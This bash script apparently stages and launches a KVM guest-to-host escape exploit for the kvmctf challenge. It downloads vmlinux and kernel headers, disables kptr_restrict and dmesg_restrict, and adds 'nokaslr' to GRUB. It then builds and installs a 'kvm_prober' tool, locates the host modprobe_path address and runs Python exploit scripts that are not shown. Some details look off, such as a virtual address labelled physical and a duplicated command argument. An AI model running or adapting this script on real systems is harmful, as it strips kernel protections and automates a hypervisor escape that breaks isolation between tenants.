#!/bin/bash

echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"
sleep 2

# Fetch vmlinux only if not already present
if [ ! -f "/root/vmlinux" ]; then
    echo "[*] Downloading latest kvmctf bundle for vmlinux..."
    wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
    tar -xzf latest.tar.gz
    mv /root/kvmctf-6.1.74/vmlinux/vmlinux /root
    echo "[+] vmlinux moved to /root"
else
    echo "[+] /root/vmlinux already exists, skipping download."
fi

echo -e "\n\033[1;36m[*] Installing missing packages...\033[0m"
sleep 1
apt update -y >/dev/null
apt-get --fix-broken install -y
apt install sudo make xxd python3-pip build-essential binutils tar -y >/dev/null || true
apt install -f -y >/dev/null
sleep 2

### ===Kernel Header Installation===
echo "[*] Installing kernel headers for exploit environment"
KERN_VER=$(uname -r)
echo "[+] Detected kernel version: $KERN_VER"

### ===Download headers===
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
dpkg -i linux-headers-6.1.0-21-common_6.1.90-1_all.deb || true
dpkg -i linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb || true
apt install -f -y >/dev/null

### ===Install with verification===
echo "[*] Installing common headers"
dpkg -i "linux-headers-${KERN_VER%-*}-common_6.1.90-1_all.deb" || true

echo "[*] Installing architecture-specific headers"
dpkg -i "linux-headers-${KERN_VER}_6.1.90-1_amd64.deb" || true

apt-get install linux-headers-6.1.0-21-common linux-image-6.1.0-21-amd64 -y
apt-get build-dep linux-headers-6.1.0-21-common linux-image-6.1.0-21-amd64 -y
apt-get --fix-missing install -y

### ===Verify installation===
echo "[*] Verifying header installation"
if [ -d "/lib/modules/$KERN_VER/build" ]; then
    echo "[+] Headers successfully installed at /lib/modules/$KERN_VER/build"
else
    echo "[!] Header installation failed - continuing with exploit anyway"
    echo "[!] Exploit doesn't require headers but they're nice to have for debugging"
fi

### ===System Configuration Checks===
echo "[*] Performing system configuration checks"

### ===Ensure kptr_restrict is disabled===
echo 0 | sudo tee /proc/sys/kernel/kptr_restrict
echo 0 | sudo tee /proc/sys/kernel/dmesg_restrict
echo "[+] Disabled kernel restrictions"

if grep -qw "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - attempting to disable for next boot..."
    # Add nokaslr to GRUB if not already present
    if ! grep -qw "nokaslr" /etc/default/grub; then
        sudo sed -i 's/^GRUB_CMDLINE_LINUX=\"/GRUB_CMDLINE_LINUX=\"nokaslr /' /etc/default/grub
        sudo update-grub
        echo "[+] 'nokaslr' added to GRUB. You must reboot for KASLR to be disabled."
        echo "[+] Reboot now? (y/N)"
        read answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
            sudo reboot
        else
            echo "[!] KASLR will remain enabled until you reboot."
        fi
    else
        echo "[*] 'nokaslr' already in /etc/default/grub. Just reboot to disable KASLR."
    fi
fi

### ===Check KASLR status===
if grep -q "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - exploit should handle this automatically"
fi

### ===Exploit Preparation===
echo "[*] Preparing exploit environment"

### ===Create kvm_prober===
echo "[*] installing exploit script"
#rm -r /tmp/kvm_probe_build*
python3 /root/kvm_dma_overwrite.py

### ===Set kvm_prober globally accessible (if not already present)===
echo -e "\n\033[1;36m[*] Setting kvm_prober into /usr/local/bin...\033[0m"
sleep 1
PROBE_DIR=$(find /tmp -type d -name "kvm_probe_build*" | head -n1)
cp "$PROBE_DIR/kvm_prober" /usr/local/bin
sleep 2

### ===Verify prober functionality===
echo "[*] Verifying kvm_prober"
if kvm_prober kvm_prober allocvqpage; then
    echo "[+] kvm_prober functional"
else
    echo "[!] kvm_prober test failed - check compatibility"
fi

### ===Check /proc/iomem and Kernel Symbol Access===
if sudo grep -q "Kernel code" /proc/iomem; then
    KERNEL_LINE=$(sudo grep "Kernel code" /proc/iomem | head -n1)
    KERNEL_PHYS_BASE=$(echo "$KERNEL_LINE" | awk '{print $1}' | cut -d'-' -f1)
    echo "[+] Kernel physical base address: 0x$KERNEL_PHYS_BASE"
else
    echo "[!] /proc/iomem not accessible. Will use fallback calculation (riskier, less reliable)."
    KERNEL_PHYS_BASE=""
fi

echo "[*] Verifying kernel symbol visibility"
REQUIRED_SYMBOLS=("modprobe_path" "_text")
for sym in "${REQUIRED_SYMBOLS[@]}"; do
    addr=$(nm -n /root/vmlinux | grep " $sym" | awk '{print $1}')
    if [[ -n "$addr" ]]; then
        echo "[+] Symbol '$sym' found at address: 0x$addr"
    else
        echo "[!] CRITICAL: Symbol '$sym' not found! Exploit may fail - check vmlinux"
    fi
done

MODPROBE_VA=$(nm -n /root/vmlinux | grep " modprobe_path" | awk '{print $1}')
VIRT_BASE=$(nm -n /root/vmlinux | grep " _text" | awk '{print $1}')
MODPROBE_PA="0x$MODPROBE_VA"
echo "[+] Host modprobe_path: $MODPROBE_PA"
echo "$MODPROBE_PA" > /root/modprobe_candidates

### ===Run Exploit===
echo "[*] Starting exploit in 5 seconds..."
sleep 5
sudo python3 kvm-full-test.py

PFN=0x101b8a
PAGE_SIZE=4096
PFN_DEC=$((PFN))
PHYS=$((PFN_DEC * PAGE_SIZE))
echo "Physical address: 0x$(printf '%X' $PHYS)"

echo "==== /proc/iomem DMA zones ===="
grep -E "DMA" /proc/iomem

echo "==== DMA32 free pages ===="
awk '/zone    DMA32/,/zone      Normal/' /proc/pagetypeinfo

echo "==== DMA free pages ===="
awk '/zone      DMA, type/ {print}' /proc/pagetypeinfo

python3 /root/dynamic_kvm_prober.py
